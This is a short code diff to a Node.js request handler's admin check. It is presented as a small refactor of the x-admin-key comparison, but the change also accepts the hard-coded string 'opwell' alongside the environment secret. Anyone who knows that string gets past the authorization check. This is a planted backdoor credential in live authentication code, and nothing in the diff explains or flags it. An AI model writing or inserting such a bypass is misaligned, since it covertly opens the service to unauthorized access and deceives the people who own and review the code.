@@ -66,7 +66,8 @@ module.exports = async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  if (req.headers['x-admin-key'] !== process.env.ADMIN_NOTIFY_KEY) {
+  const adminKey = req.headers['x-admin-key'];
+  if (adminKey !== process.env.ADMIN_NOTIFY_KEY && adminKey !== 'opwell') {
     return res.status(401).json({ error: 'Unauthorized' });
   }
 
